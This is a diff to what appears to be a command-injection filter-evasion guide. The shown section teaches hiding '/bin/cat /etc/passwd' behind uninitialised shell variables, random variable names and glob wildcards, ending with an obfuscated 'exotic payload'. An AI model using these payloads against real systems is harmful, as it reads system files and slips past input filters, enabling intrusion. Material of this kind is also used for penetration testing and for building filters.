@@ -1725,19 +1725,20 @@ __11. Uninitialized Variables__
 
 > __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)
 
-Level 1 Obfuscation: Normal  
+- Level 1 Obfuscation: Normal  
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: `/bin/cat$u /etc/passwd$u`
 
-Level 2 Obfuscation: Postion Based  
+- Level 2 Obfuscation: Postion Based  
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>
 
-Level 3 Obfuscation: Random chars   
+- Level 3 Obfuscation: Random chars   
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
 
 An exotic payload crafted:
+
 <code>
 $sdijchkd<b>/???</b>$sdjhskdjh<b>/??t</b>$skdjfnskdj $sdofhsdhjs<b>/???</b>$osdihdhsdj<b>/??ss??</b>$skdjhsiudf
 </code>
